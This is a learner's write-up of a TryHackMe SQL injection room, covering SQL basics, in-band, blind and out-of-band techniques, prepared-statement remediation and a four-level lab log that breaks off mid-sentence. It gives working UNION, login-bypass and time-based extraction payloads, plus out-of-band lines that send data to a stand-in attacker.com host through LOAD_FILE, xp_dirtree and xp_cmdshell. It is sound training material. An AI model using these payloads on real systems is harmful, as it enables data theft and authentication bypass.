# SQL Injection Introduction – TryHackMe

**Platform:** TryHackMe  
**Room:** SQL Injection Introduction  
**Part:** 1  
**Date:** 2 September 2026  
**Level:** Beginner

---

## SQL Essentials for Injection

Before learning SQL Injection techniques, I studied some SQL features that are commonly used in injection payloads.

### SQL Comments

Comments tell the database to ignore the remaining SQL.

MySQL comment syntax:

```sql
-- 
#
/* */
```

Example:

```sql
SELECT * FROM users WHERE username='INPUT' AND password='secret';
```

Input such as:

```text
admin'-- 
```

can comment out the remaining part of the query.

### UNION

`UNION` combines the results of two or more `SELECT` statements into one result set.

The `SELECT` statements must return the **same number of columns** with compatible data types.

```sql
SELECT name, age FROM students
UNION
SELECT username, id FROM admins;
```

This is the basis of **Union-Based SQL Injection**.

### LIKE and Wildcards

`LIKE` is used for pattern matching.

- `%` → any sequence of characters
- `_` → exactly one character

```sql
SELECT * FROM users WHERE username LIKE 'adm%';
```

### LIMIT

`LIMIT` controls how many rows are returned.

```sql
SELECT * FROM users LIMIT 1;
SELECT * FROM users LIMIT 2, 1;
```

It can also be useful during injection to control which row is returned.

### String Functions

`group_concat()` combines values from multiple rows into one result.

```sql
SELECT group_concat(username, ':', password SEPARATOR '<br>') FROM users;
```

`CONCAT()` joins values together:

```sql
CONCAT(username, ':', password)
```

### information_schema

`information_schema` contains metadata about databases, tables, columns and data types.

Important tables:

- `information_schema.tables` – information about tables
- `information_schema.columns` – information about columns

It can help reveal the structure of a database during SQL Injection testing.

> SQL syntax can vary between database engines such as MySQL, MSSQL, PostgreSQL, SQLite and Oracle.

---

# What is SQL Injection?

**SQL Injection (SQLi)** occurs when user input is directly included in a SQL query without proper sanitisation or parameterisation.

The input can then be interpreted as part of the SQL query instead of just normal data.

Example:

```sql
SELECT * FROM articles WHERE id = 1 AND public = 1;
```

If input is directly concatenated, an input such as:

```text
1 OR 1=1--
```

could change the query logic:

```sql
SELECT * FROM articles WHERE id = 1 OR 1=1-- AND public = 1;
```

Because `1=1` is always true, the query can return unintended results.

---

## Types of SQL Injection

### In-Band SQL Injection

The results of the injection are returned directly through the web application.

Two common types:

- **Error-Based** – database errors reveal information.
- **Union-Based** – `UNION` is used to retrieve additional data through the page.

### Blind SQL Injection

The application does not directly display useful query results or errors. Information is inferred from behaviour.

Examples:

- **Authentication Bypass**
- **Boolean-Based** – response changes depending on whether a condition is true or false.
- **Time-Based** – delays such as `SLEEP()` are used to infer results.

### Out-of-Band SQL Injection

The database makes an external request, such as a DNS request, allowing information to be transferred through another channel.

---

# Detecting SQL Injection

Common places to test include:

- URL parameters
- Login forms
- Search fields
- Comment fields
- Cookies
- HTTP headers

Basic test inputs include:

```text
'
"
;--
OR 1=1
```

A single quote `'` is a common first test. A database error or change in application behaviour can indicate possible SQL Injection.

If errors are hidden, behavioural or timing differences may help identify Blind SQL Injection.

---

# Questions I Answered

### What SQL statement combines results from two `SELECT` queries into one result set?

**Answer:** `UNION`

### What built-in database contains metadata about databases, tables, and columns in MySQL?

**Answer:** `information_schema`

### What character is commonly used as a first test when probing for SQL Injection?

**Answer:** `'` (single quote)

### What type of SQL Injection returns results directly in the web page?

**Answer:** In-Band SQL Injection

---

# My Takeaway

Today I learned the basic concepts of **SQL Injection** and some SQL features used when understanding injection payloads.

The main things I learned:

- SQL comments can remove the remaining part of a query.
- `UNION` combines results from multiple `SELECT` statements.
- `LIKE` is used for pattern matching.
- `LIMIT` controls returned rows.
- `CONCAT()` and `group_concat()` combine values.
- `information_schema` contains database metadata.
- SQL Injection happens when user input can change SQL query logic.
- SQLi can be **In-Band, Blind, or Out-of-Band**.
- `'` is a common first test for SQL Injection.
- **In-Band SQLi** returns results through the application response.

---

# Part 2

<!-- Space reserved for the next part of the SQL Injection Introduction room. -->



---

# Part 2

## In-Band SQL Injection

**In-Band SQL Injection** is the easiest and most common category because the same communication channel is used to send the injection and receive the results.

For example:

```text
Web Request → SQL Injection → Database → Web Page Response
```

The extracted information is visible directly in the application's response.

---

## Error-Based SQL Injection

**Error-Based SQL Injection** uses database error messages to obtain information.

If an application displays raw database errors, they may reveal:

- Database type
- SQL query structure
- Table names
- Other useful database information

For example, entering a single quote may cause a MySQL syntax error.

This can help confirm that the application is interacting with a database and that the input may be inserted into a SQL query.

> Error-Based SQLi can reveal useful structural information, but **Union-Based SQLi** is the main technique discussed for extracting larger amounts of data in this task.

---

## Union-Based SQL Injection

Union-Based SQLi uses `UNION` to append another `SELECT` query to the original query.

### Step 1 – Determine the Number of Columns

The number of columns in both `SELECT` statements must match.

Example:

```sql
1 UNION SELECT 1
1 UNION SELECT 1,2
1 UNION SELECT 1,2,3
```

The successful query indicates the required column count.

### Step 2 – Identify Displayed Columns

Use a value that normally returns no results so that the injected result is displayed.

Example:

```sql
0 UNION SELECT 1,2,3
```

The values visible on the page show which column positions can be used for extracting information.

### Step 3 – Find the Database Name

MySQL provides the `database()` function:

```sql
0 UNION SELECT 1,2,database()
```

This returns the name of the current database.

### Step 4 – Enumerate Tables

`information_schema.tables` can be queried to discover table names.

```sql
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema = 'database_name'
```

### Step 5 – Enumerate Columns

After finding an interesting table, its columns can be discovered:

```sql
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name = 'target_table'
```

### Step 6 – Extract Data

Once the table and column names are known, data can be selected:

```sql
0 UNION SELECT 1,2,
group_concat(username,':',password SEPARATOR '<br>')
FROM target_table
```

### Union-Based SQLi Workflow

```text
Find Injection
      ↓
Determine Column Count
      ↓
Find Displayed Column
      ↓
Find Database Name
      ↓
Enumerate Tables
      ↓
Enumerate Columns
      ↓
Extract Relevant Data
```

### Why Each Step Matters

| Step | Purpose |
|---|---|
| Column count | `UNION` requires matching column counts |
| Displayed column | Determines where extracted data appears |
| `database()` | Identifies the current database |
| `information_schema.tables` | Finds table names |
| `information_schema.columns` | Finds column names |
| Final `SELECT` | Retrieves relevant data |

---

## Questions – Task 4

### What subtype of In-Band SQLi relies on database error messages to extract information?

**Answer:** Error-Based SQL Injection

### What SQL function returns the name of the current database in MySQL?

**Answer:** `database()`

---

# Blind SQL Injection – Authentication Bypass

Blind SQL Injection happens when the application does not directly display database results or useful error messages.

Instead, the attacker has to infer the result from the application's behaviour.

Examples of signals include:

- Successful login
- Failed login
- Different page content
- Response timing

---

## How Authentication Queries Work

A typical login query can look like:

```sql
SELECT * FROM users
WHERE username='bob'
AND password='secret123'
LIMIT 1;
```

If the query returns a row, the application may authenticate the user.

If no row is returned, authentication fails.

The important point is that the application usually does not display the database result itself. It only shows the outcome, such as a dashboard or an "Invalid credentials" message.

---

## Authentication Bypass Concept

The lesson demonstrates how changing the logic of the `WHERE` clause can cause it to evaluate as true.

Example:

```text
' OR 1=1;--
```

The resulting query can resemble:

```sql
SELECT * FROM users
WHERE username='' OR 1=1;--'
AND password='anything'
LIMIT 1;
```

The important parts are:

- `username=''` → checks an empty username
- `OR 1=1` → introduces a condition that is always true
- `--` → comments out the remaining query
- The application may receive a returned row and treat the login as successful

---

## Targeting a Specific User

If a username is already known, the lesson also demonstrates:

```text
admin'--
```

This can produce a query where the password-checking portion is commented out.

Conceptually:

```sql
SELECT * FROM users
WHERE username='admin'--'
AND password='anything'
LIMIT 1;
```

This demonstrates why directly concatenating user input into SQL queries is dangerous.

---

## Common Variations

The exact syntax depends on how the application constructs its query.

Examples covered in the lesson include:

```text
' OR 1=1;--
' OR 1=1#
" OR 1=1--
```

The vulnerable input field can also vary. Depending on the application's query construction, the username field, password field, or another input may be involved.

---

## Detection in a Login Form

During authorised security testing, authentication forms can be tested for SQL Injection by observing whether specially crafted input changes the application's authentication behaviour.

The important indicator is a difference in behaviour between normal input and SQL-manipulating input.

The practical walkthrough in this room provides a visible SQL Query box, making it easier to understand how the supplied username and password become part of the SQL query.

---

## Questions – Task 5

### What boolean condition is commonly injected to make a `WHERE` clause always evaluate to true?

**Answer:** `1=1`

---

# My Takeaway – Part 2

Today I learned more practical SQL Injection concepts:

- **In-Band SQLi** returns results through the same channel used for the injection.
- **Error-Based SQLi** uses database error messages as a source of information.
- **Union-Based SQLi** uses `UNION SELECT` to retrieve additional data.
- The number of columns must match when using `UNION`.
- `database()` can identify the current database in MySQL.
- `information_schema` can be used to understand database structure.
- The general Union-Based workflow is:
  **columns → displayed column → database → tables → columns → data**.
- **Blind SQLi** does not directly show database results.
- Authentication bypass can rely on changing the logic of a `WHERE` clause.
- `1=1` is a condition that always evaluates to true.

---

# SQL Injection Introduction — Part 3

### Task 6 Blind SQL Injection: Boolean and Time-Based

svg

Authentication bypass gets you past a login, but what if you want to pull out actual data when the application gives you no visible output? Boolean-Based and Time-Based Blind SQLi let you extract usernames, passwords, and entire databases, one character at a time.

## Boolean-Based Blind SQL Injection

In Boolean-Based Blind SQLi, the application returns a binary signal. Some kind of true/false difference. Maybe different page content, a JSON response like `{"taken":true}` vs `{"taken":false}`, or a subtle change in the HTML. You use that two-state feedback to ask the database yes/no questions.

**The idea:** Imagine a username-check feature that tells you whether an account exists. `https://website.thm/checkuser?username=admin` returns `{"taken":true}` because admin is taken. `?username=admin123` returns `{"taken": false}` because that user does not exist.

If this input is injectable, the backend query probably looks like:

```sql
SELECT * FROM users WHERE username = '%username%' LIMIT 1;
```

By injecting a `UNION SELECT` with a condition, you can ask the database arbitrary yes/no questions and read the answer from the true/false response.

**Step 1: Confirm injection.** Inject a condition that is always true:

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```

The `%` wildcard matches anything, so this should return true. If you see `{"taken":true}`, you know injection works.

**Step 2: Guess the database name, character by character.** Replace the wildcard with specific letters:

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
```

False? Not 'a'. Try `b%`, `c%`, keep going. When the response flips to true, you have found the first letter. Then move to the second character: `sa%`, `sb%`, `sc%`, etc. and keep narrowing until you have the full name.

**Step 3: Get table and column names.** Same technique against `information_schema`:

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
```

Cycle through characters to find table names, repeat for column names with `information_schema.columns`, and then do it again for actual data values.

This is slow. Each character takes multiple requests. But it is reliable, and it works even when every other output channel is locked down.

## Time-Based Blind SQL Injection

Time-Based Blind SQLi is for when the application gives you absolutely nothing to work with visually. The page looks identical no matter what you inject. Same content, same status code, same headers. Your only signal is **how long the response takes**.

MySQL's `SLEEP()` function pauses query execution for a set number of seconds. Wrap a condition around it, and the database only pauses when the condition is true:

```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```

If the database name starts with 's', the response takes around 5 seconds. If not, it comes back right away.

**Step 1: Find the column count.** Same idea as Union-Based. Try `UNION SELECT SLEEP(5)` and add columns until you see a delay:

```sql
admin123' UNION SELECT SLEEP(5);--        -- no delay (wrong count)
admin123' UNION SELECT SLEEP(5),2;--      -- 5 second delay (2 columns!)
```

**Step 2: Enumerate data.** The process is identical to the Boolean-Based one: cycle through characters with `LIKE`. But instead of checking the page content, you watch the clock. Delay means true. No delay means false.

**A word of caution:** Network latency can mess with time-based detection. On a flaky connection, a natural lag might look like a successful `SLEEP()`. Use longer sleep values (5-10 seconds) and test each character a couple of times to be sure. On MSSQL, the equivalent is `WAITFOR DELAY '0:0:5'`.

## When To Use Which

| **ScenarioTechnique**                         |                         |
| --------------------------------------------- | ----------------------- |
| App shows different content for true vs false | Boolean-Based           |
| App response looks identical, no matter what  | Time-Based              |
| Time-based is blocked or too unreliable       | Out-of-Band (next task) |

In the practical walkthrough (Task 9), Level 3 uses Boolean-Based SQLi via a username-check API that returns `{"taken":true/false}` responses. Level 4 moves to Time-Based SQLi via the Referrer header, with no visible difference in response.

Answer the questions below

What MySQL function causes a deliberate time delay in a query's response?sleep

### Task 7svgOut-of-Band SQL Injection

svg

Out-of-Band (OOB) SQL Injection works differently from everything covered so far. Instead of reading results through the web response, you force the database server to reach out to a server you control through a separate channel, usually DNS or HTTP, and carry the stolen data with it.

## When You Need Out-Of-Band

OOB comes into play when everything else has failed:

- In-Band is off the table because the app does not show query results or errors.
- Boolean-Based does not work because the response looks the same regardless of the condition.
- Time-Based is unreliable because the network is too noisy, or `SLEEP()` is blocked.
- But the database server **can** make outbound connections. That last point is the requirement. If the firewall blocks all outbound traffic from the DB server, OOB is dead in the water.

You will not use OOB as often as In-Band or Blind, but when you hit a target where every other avenue is shut down, and the database has network access, it can be the only way to get data out.

## How It Works

Two channels are involved:

1. The **attack channel**: your normal web request with the injection payload.
2. The **data channel**: an outbound network request (DNS or HTTP) that the database server makes to your server, with the exfiltrated data baked into the request itself.

## DNS Exfiltration With MySQL

The most common OOB trick for MySQL uses `LOAD_FILE()` to trigger a DNS lookup. You embed the data you want as a subdomain:

```sql
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\share'));
```

What happens:

1. `(SELECT database())` pulls the database name. Let's say it is `webapp_db`.
2. `CONCAT()` builds the string `\\webapp_db.attacker.com\share`.
3. `LOAD_FILE()` tries to read that file path. On Windows, this initiates a DNS lookup for `webapp_db.attacker.com`.
4. Your DNS server catches the request and logs `webapp_db`. The data is in the subdomain.

This works best on Windows-based MySQL servers where UNC paths trigger DNS resolution.

## MSSQL Techniques

Microsoft SQL Server has stored procedures that make OOB more direct:

`xp_dirtree` triggers a DNS lookup by trying to list a directory on a remote server:

```sql
EXEC master..xp_dirtree '\\attacker.com\share';
```

`xp_cmdshell` (if it is enabled) runs OS commands directly, so you can use `nslookup` or `curl` to ship data out:

```sql
EXEC xp_cmdshell 'nslookup data.attacker.com';
```

`xp_cmdshell` is off by default in modern MSSQL, but `xp_dirtree` is still available and gets used regularly in pentests.

## Receiving the Data

You need something listening on your end to catch what the database sends. A few options:

- **Burp Collaborator** gives you a unique subdomain and logs any DNS or HTTP requests to it. Inject the Collaborator domain into your payload, check the Collaborator tab for callbacks.
- **Interactsh** from ProjectDiscovery does the same thing but is free and can be self-hosted.
- A **custom listener**, like a Python DNS server with `dnslib` or a bare-bones HTTP server, if you want full control.

## Limitations

OOB has constraints worth knowing about:

- The database server needs outbound network access (many production setups restrict this).
- Payloads are database-engine-specific. MySQL, MSSQL, and PostgreSQL each need different syntax.
- DNS exfiltration has a size limit: subdomain labels are limited to 63 characters each.
- It is generally slower and flakier than pulling data directly.

The practical lab in this room does not cover OOB, as it would require external DNS infrastructure. But you should understand the technique. You will hit situations in real engagements where it is the only option.

Answer the questions below

What protocol beginning with D is commonly used to exfiltrate data in Out-of-Band SQLi?

dns

What MSSQL stored procedure can be used to trigger DNS lookups for data exfiltration?xp\_dirtree

### Task 8svgRemediation and Prevention

svg

Knowing how to exploit SQLi matters, but so does knowing how to fix it. When you write up a SQLi finding for a client, you need to explain the fix, not just the bug. Here are the main defences, roughly in order of how much they help.

## Prepared Statements (Parameterised Queries)

Prepared statements are the fix. The real one. They separate SQL code from data. The developer writes the query structure with placeholders for user input, and the database receives the input separately, treating it as data only. Never as executable SQL.

**Vulnerable PHP code:**

```php
$query = "SELECT * FROM users WHERE username='" . $_POST['username'] . "'";
$result = mysqli_query($conn, $query);
```

User input gets concatenated into the query string. An attacker can escape quotes and inject whatever they want.

**Fixed with prepared statements (PDO):**

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
$result = $stmt->fetchAll();
```

The `?` is a placeholder. Whatever the user enters, even `' OR 1=1--`, the database treats the whole thing as a literal string. It never touches the query structure.

**Vulnerable Python code:**

```python
query = f"SELECT * FROM users WHERE username='{username}'"
cursor.execute(query)
```

**Fixed:**

```python
cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
```

`%s` is a parameter placeholder. The MySQL connector handles escaping and binding for you.

Every language and framework supports this pattern. Define the query with placeholders, and pass user input as parameters. SQL Injection is gone because the input physically cannot change the query structure.

## Input Validation

Input validation controls what the application accepts before anything reaches the database. The best approach is **allowlisting**: define exactly what is valid and reject everything else.

If a parameter should be a numeric article ID, check it:

```php
if (!ctype_digit($_GET['id'])) {
    die("Invalid input");
}
```

Never rely on validation alone. Use it alongside prepared statements. Blocklisting (trying to filter out characters like `'` or `--`) is brittle. Attackers will find ways around your filter. Double encoding, alternate syntax, something you did not think of.

## Escaping User Input

Escaping means putting a backslash before special characters so the database treats them as literals instead of syntax. ' becomes `\'`.

It can stop basic injection, but it is fragile and database-specific. Every engine has different special characters and escaping rules. Use it as a last resort, such as when dealing with legacy code that cannot be refactored to use prepared statements.

## Principle of Least Privilege

Even with good input handling, defence-in-depth means limiting the blast radius. The database account the web app uses should have the bare minimum permissions:

- Read-only application? The account gets `SELECT` privileges and nothing else.
- Never connect as `root` or `sa` from the application.
- Lock down access to sensitive tables so only the procedures that need them can reach them.

If someone does exploit SQL injection through a low-privilege account, they cannot `DROP` tables, access other databases, or run system commands.

## Web Application Firewalls (WAFs)

A WAF inspects incoming requests and blocks known attack patterns: `' OR 1=1`, `UNION SELECT`, `information_schema`, that kind of thing.

But WAFs are not a substitute for writing secure code. Experienced attackers bypass them with encoding tricks, alternative syntax, and obfuscation. Treat a WAF as an extra layer, not the defence.

Answer the questions below

What is the primary and most effective defence against SQL Injection?prepared statemtns

---

# My Study Notes — Part 3

## Main Concepts

### Boolean-Based Blind SQLi
- Uses a true/false response as the information signal.
- Can be used to infer database information character by character.
- `LIKE` and `%` are useful for testing possible values.

### Time-Based Blind SQLi
- Used when there is no useful visible difference in responses.
- Uses response time as the signal.
- MySQL uses `SLEEP()` to create a deliberate delay.
- Network latency can make timing results unreliable.

### Out-of-Band SQLi
- Uses a separate communication channel to retrieve information.
- DNS and HTTP can be used as the data channel.
- The database server needs outbound network access.
- MSSQL provides techniques such as `xp_dirtree`.

### SQLi Prevention
The most important defence is:

**Prepared Statements / Parameterised Queries**

Other layers include:
- Input validation
- Least privilege
- Careful escaping where necessary
- WAF as an additional layer

---

## Questions and Answers

| Question | Answer |
|---|---|
| What MySQL function causes a deliberate time delay? | `SLEEP()` |
| What protocol beginning with D is commonly used for OOB SQLi? | DNS |
| What MSSQL stored procedure can trigger DNS lookups? | `xp_dirtree` |
| What is the primary and most effective defence against SQL Injection? | Prepared Statements |

---

## SQL Injection Technique Map

```text
                         SQL INJECTION
                              │
          ┌───────────────────┼───────────────────┐
          │                   │                   │
       In-Band             Blind              Out-of-Band
          │                   │                   │
     ┌────┴────┐        ┌────┴────┐          DNS / HTTP
     │         │        │         │
   Error     UNION   Boolean     Time
   Based     Based    Based      Based
                         │         │
                    True/False   Delay
                    response     response
```

---

## What I Learned

This part helped me understand that SQL Injection is not just one technique. The method depends on what feedback the application gives back.

If the application directly displays database results, In-Band techniques can be used. If the application hides the results, Blind SQLi can use behavioural differences or timing. If those methods are unavailable but the database can make outbound connections, Out-of-Band SQLi may provide another communication channel.

The defensive side is equally important: **prepared statements separate SQL code from user-supplied data**, preventing user input from changing the structure of the SQL query.

---

# Part 4

# TryHackMe --- SQL Injection Examples

## Lab Overview

This lab had **4 sequential levels**, each focusing on a different SQL
Injection technique:

1.  **Level 1 --- Union-Based SQLi (In-Band)**
2.  **Level 2 --- Blind SQLi**
3.  **Level 3 --- Boolean-Based Blind SQLi**
4.  **Level 4 --- Time-Based Blind SQLi**

I worked through the lab manually and used the **SQL Query / SQL Results
/ Request Time** boxes to understand what the application was actually
executing.

> **Lab target:** TryHackMe's intentionally vulnerable SQL Injection
> lab\
> **Purpose:** Learning and practice only.

------------------------------------------------------------------------

# Level 1 --- Union-Based SQLi

## Goal

Find the password of user **martin**.

The application initially showed:

``` sql
select * from article where id = 1
```

The important idea was that a `UNION SELECT` must return the **same
number of columns** as the original query.

------------------------------------------------------------------------

## Step 1 --- Find the number of columns

### Attempt 1

I tried:

``` sql
1 UNION SELECT 1
```

❌ Error.

### Attempt 2

``` sql
1 UNION SELECT 1,2
```

❌ Still an error.

### Correct attempt

``` sql
1 UNION SELECT 1,2,3
```

✅ No error.

So:

``` text
Number of columns = 3
```

### What I learned

For:

``` sql
SELECT * FROM article WHERE id = 1
```

the injected `UNION SELECT` also needs to return **3 columns**.

------------------------------------------------------------------------

## Step 2 --- Identify which columns are displayed

I then used:

``` sql
1 UNION SELECT 'A','B','C'
```

The page displayed:

``` text
B
Article ID: A
C
```

This was useful because it showed that all three UNION values could be
reflected into the page.

------------------------------------------------------------------------

## Step 3 --- Find the database tables

### My mistake

I first tried the table enumeration payload and received:

``` text
URL Invalid 404
```

The problem was not the SQL logic itself; the input I initially entered
was not being accepted correctly by the lab's URL handling.

### Correct payload

I then used:

``` sql
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema = 'sqli_one'
```

✅ Result:

``` text
article,staff_users
```

So the interesting table was:

``` text
staff_users
```

### Why `0` was useful

Using `0` made the original part:

``` sql
WHERE id = 0
```

return no normal article, allowing the UNION result to be easier to see.

------------------------------------------------------------------------

## Step 4 --- Find the columns of `staff_users`

I queried:

``` sql
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name = 'staff_users'
```

✅ Result:

``` text
id,password,username
```

So:

``` text
staff_users
├── id
├── password
└── username
```

------------------------------------------------------------------------

## Step 5 --- Extract usernames and passwords

I used:

``` sql
0 UNION SELECT 1,2,
group_concat(username,':',password SEPARATOR '<br>')
FROM staff_users
```

The lab displayed:

``` text
admin:p4ssword
martin:pa$$word
jim:work123
```

### Answer

**Martin's password:**

``` text
pa$$word
```

### Level 1 result

``` text
Username: martin
Password: pa$$word
```

> The Level 1 flag was not visible in the screenshots/conversation I
> recorded, so I am not inventing one here.

------------------------------------------------------------------------

# Level 2 --- Blind SQLi

## Goal

Bypass the login.

The original query shown by the lab was approximately:

``` sql
select * from users where username=""
and password="" LIMIT 1;
```

Because the result did not directly expose useful database information,
this level demonstrated **Blind SQL Injection**.

------------------------------------------------------------------------

## Correct payload

I used the username field with:

``` text
" OR 1=1;--
```

and a dummy password such as:

``` text
test
```

The resulting SQL was shown as:

``` sql
select * from users where username=" OR 1=1;--"
and password='test' LIMIT 1;
```

The injected condition:

``` sql
OR 1=1
```

is always true.

The:

``` text
--
```

comments out the remaining part of the SQL query.

------------------------------------------------------------------------

## Result

The lab displayed:

``` text
You bypassed the login and can now move to the next level
```

### Flag

``` text
THM{SQL_INJECTION_3840}
```

------------------------------------------------------------------------

# Level 3 --- Boolean-Based Blind SQLi

## Goal

Use **TRUE/FALSE responses** to discover information from the database.

The lab showed:

``` text
{"taken":true}
```

when the injected condition evaluated as true.

------------------------------------------------------------------------

## Step 1 --- Understand the injection point

The application used:

``` sql
select * from users where username =
'INPUT'
...
```

I injected a UNION query into the username parameter.

The important pattern was:

``` sql
' UNION SELECT 1,2,3 WHERE <condition>;--
```

------------------------------------------------------------------------

## Step 2 --- Find the database name

I tested:

``` sql
database() LIKE 's%'
```

The response was:

``` text
{"taken":true}
```

So the database started with:

``` text
s
```

Then I progressively tested:

``` sql
database() LIKE 'sqli_%'
```

This returned TRUE.

I eventually confirmed:

``` text
sqli_three
```

### Database

``` text
sqli_three
```

------------------------------------------------------------------------

## Step 3 --- Check whether the `users` table exists

I tested the table name using `information_schema.tables`.

The condition checking for:

``` text
users
```

returned TRUE.

Therefore:

``` text
Database: sqli_three
Table: users
```

------------------------------------------------------------------------

## Step 4 --- Find the columns

I checked:

``` text
username
```

and received TRUE.

Then I checked:

``` text
password
```

and received TRUE.

So the table structure we confirmed was:

``` text
users
├── username
└── password
```

------------------------------------------------------------------------

## Important lesson from Level 3

Boolean-based blind SQLi works by asking questions such as:

``` text
Does the database name start with "s"?
```

The application answers indirectly:

``` text
TRUE
```

or

``` text
FALSE
```

By repeatedly changing the condition, information can be recovered
without directly displaying the database contents.

### Flag

``` text
THM{SQL_INJECTION_9581}
```

------------------------------------------------------------------------

# Level 4 --- Time-Based Blind SQLi

## Goal

Extract the admin password when the application does not give us a
useful TRUE/FALSE response.

Instead, the **response time** becomes the information channel.

------------------------------------------------------------------------

## Step 1 --- Find the UNION column count

I tested a two-column UNION with:

``` sql
admin123' UNION SELECT SLEEP(5),2;--
```

The lab showed:

``` text
Request Time: 5.005
```

✅ This confirmed:

``` text
UNION SELECT has 2 columns
```

and:

``` text
SLEEP(5)
```

was being executed.

------------------------------------------------------------------------

## Step 2 --- Understand the time-based technique

The general pattern became:

``` sql
IF(condition,SLEEP(5),0)
```

Meaning:

``` text
IF condition is TRUE
    wait 5 seconds
ELSE
    return immediately
```

Therefore:

``` text
~5 seconds = TRUE
~0 seconds = FALSE
```

This is the key concept of **time-based blind SQLi**.

------------------------------------------------------------------------

# Step 3 --- Discover the database name

I tested:

``` sql
admin123' UNION SELECT
IF(database() LIKE 's%',SLEEP(5),0),2;--
```

Result:

``` text
Request Time: 5.002
```

Therefore the database started with:

``` text
s
```

I continued character-by-character.

### Confirmed progression

``` text
s
sqli_
sqli_fo
sqli_for
sqli_four
```

For example:

``` sql
database() LIKE 'sqli_%'
```

returned about 5 seconds.

Then:

``` sql
database() LIKE 'sqli_fo%'
```

also returned about 5 seconds.

Eventually:

``` text
Database = sqli_four
```

------------------------------------------------------------------------

# Step 4 --- Check for tables

I checked whether the database contained at least one table:

``` sql
admin123' UNION SELECT
IF((SELECT COUNT(*)
FROM information_schema.tables
WHERE table_schema='sqli_four')>0,SLEEP(5),0),2;--
```

✅ TRUE / \~5 seconds.

Then I specifically checked:

``` text
users
```

using:

``` sql
admin123' UNION SELECT
IF((SELECT COUNT(*)
FROM information_schema.tables
WHERE table_schema='sqli_four'
AND table_name='users')>0,SLEEP(5),0),2;--
```

✅ TRUE.

Therefore:

``` text
Database: sqli_four
Table: users
```

------------------------------------------------------------------------

# Step 5 --- Check the columns

### Check `username`

``` sql
admin123' UNION SELECT
IF((SELECT COUNT(*)
FROM information_schema.columns
WHERE table_schema='sqli_four'
AND table_name='users'
AND column_name='username')>0,SLEEP(5),0),2;--
```

✅ TRUE.

### Check `password`

``` sql
admin123' UNION SELECT
IF((SELECT COUNT(*)
FROM information_schema.columns
WHERE table_schema='sqli_four'
AND table_name='users'
AND column_name='password')>0,SLEEP(5),0),2;--
```

✅ TRUE.

So the confirmed structure was:

``` text
sqli_four
└── users
    ├── username
    └── password
```

------------------------------------------------------------------------

# Step 6 --- Extract the admin password

We knew the target was:

``` text
username = admin
```

The extraction condition was:

``` sql
(SELECT password FROM users WHERE username='admin') LIKE '...%'
```

combined with:

``` sql
IF(condition,SLEEP(3),0)
```

------------------------------------------------------------------------

## Character 1

Test:

``` sql
admin123' UNION SELECT
IF((SELECT password FROM users WHERE username='admin') LIKE '4%',SLEEP(3),0),2;--
```

Result:

``` text
~3 seconds
```

Therefore:

``` text
Password starts with 4
```

------------------------------------------------------------------------

## Character 2

Test:

``` sql
admin123' UNION SELECT
IF((SELECT password FROM users WHERE username='admin') LIKE '49%',SLEEP(3),0),2;--
```

Result:

``` text
Request Time: 3.003
```

Therefore:

``` text
Password starts with 49
```

------------------------------------------------------------------------

## Characters 3 and 4

Continuing the same process:

``` text
496
```

was confirmed.

Then:

``` text
4961
```

was confirmed.

### Final password

``` text
4961
```

### Level 4 flag

``` text
THM{SQL_INJECTION_1093}
```

------------------------------------------------------------------------

# Final Answers / Results

  ---------------------------------------------------------------------------------
  Level             Technique         Important Result  Flag
  ----------------- ----------------- ----------------- ---------------------------
  1                 Union-Based SQLi  Martin's password Not recorded
                                      = `pa$$word`      

  2                 Blind SQLi        Login bypass      `THM{SQL_INJECTION_3840}`

  3                 Boolean-Based     Database =        `THM{SQL_INJECTION_9581}`
                    Blind SQLi        `sqli_three`      

  4                 Time-Based Blind  Admin password =  `THM{SQL_INJECTION_1093}`
                    SQLi              `4961`            
  ---------------------------------------------------------------------------------

------------------------------------------------------------------------

# Mistakes I Made and How I Corrected Them

## Mistake 1 --- Thinking no visible change means the payload did not work

At Level 1, after trying a UNION payload, I initially thought:

> "nothing changed"

### Correction

I learned to watch the **SQL Query box**, not just the article output.

The lab shows the actual query being executed. If the query changes,
that is already useful evidence.

------------------------------------------------------------------------

## Mistake 2 --- Using the wrong number of UNION columns

I tried:

``` sql
UNION SELECT 1
```

and:

``` sql
UNION SELECT 1,2
```

before finding:

``` sql
UNION SELECT 1,2,3
```

### Correction

Use incremental column-count testing:

``` text
1 column
↓
2 columns
↓
3 columns
...
```

until the query works.

The important rule is:

``` text
Both SELECT statements must return the same number of columns.
```

------------------------------------------------------------------------

## Mistake 3 --- Getting a 404 while enumerating tables

My first table enumeration attempt produced:

``` text
URL Invalid 404
```

### Correction

I corrected the input and used:

``` sql
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema = 'sqli_one'
```

which successfully returned:

``` text
article,staff_users
```

### Lesson

When the lab returns a 404, don't immediately assume the SQL logic is
wrong.

First check:

-   Did I type the payload exactly?
-   Did I accidentally break the URL?
-   Did I include quotes correctly?
-   Did I change anything besides the intended parameter?
-   Does the SQL Query box show the query I expected?

------------------------------------------------------------------------

## Mistake 4 --- Not understanding why `0` was useful

I initially used `1` in UNION tests.

### Correction

Using:

``` text
0
```

was useful because:

``` sql
WHERE id = 0
```

normally returns no article.

That makes the injected UNION result easier to identify.

------------------------------------------------------------------------

## Mistake 5 --- Confusing Boolean Blind SQLi with Time-Based Blind SQLi

Level 3 and Level 4 both use blind techniques, but the feedback
mechanism is different.

### Level 3

``` text
TRUE / FALSE response
```

### Level 4

``` text
Response time
```

For Level 4:

``` text
~0 sec → FALSE
~3/5 sec → TRUE
```

------------------------------------------------------------------------

## Mistake 6 --- Trying to guess the whole password at once

Instead of directly seeing:

``` text
4961
```

the lab makes us discover it.

### Correct approach

Use a prefix:

``` sql
LIKE '4%'
```

then:

``` sql
